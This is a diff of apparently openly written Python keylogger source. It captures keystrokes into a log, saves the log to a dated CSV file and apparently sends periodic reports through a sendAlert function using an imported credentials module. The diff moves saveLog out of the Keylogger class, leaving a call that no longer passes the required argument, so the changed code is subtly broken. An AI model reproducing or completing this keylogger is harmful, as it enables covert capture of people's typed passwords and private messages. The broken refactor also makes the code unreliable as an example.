@@ -12,6 +12,18 @@ import credenciais as cr
 
 SEND_REPORT_EVERY = 30
 
+
+def saveLog(self):
+    import csv
+    from datetime import date
+    fields = ['valor', 'frase']
+    rows = [['no', self.log]]
+    filename = "log_rec_" + str(date.today()) + ".csv"
+    with open(filename, 'w') as csvfile:
+        csvwriter = csv.writer(csvfile)
+        csvwriter.writerow(fields)
+        csvwriter.writerows(rows)
+
 def getProcess(self):
     infoSet = set()
     for proc in ps.process_iter():
@@ -58,6 +70,8 @@ def sendAlert(self):
         print("Error to send Alert")
         pass
 
+
+
 class Keylogger:
     def __init__(self, interval):
         self.interval = interval
@@ -77,20 +91,10 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
 
-    def saveLog(self):
-        import csv
-        from datetime import date
-        fields = ['valor','frase']
-        rows = [['no', self.log]]
-        filename = "log_rec_"+str(date.today())+".csv"
-        with open(filename, 'w') as csvfile:
-            csvwriter = csv.writer(csvfile)
-            csvwriter.writerow(fields)
-            csvwriter.writerows(rows)
 
     def report(self):
         if self.log:
-            self.saveLog()
+            saveLog()
             sendAlert(self)
 
         self.log = ""
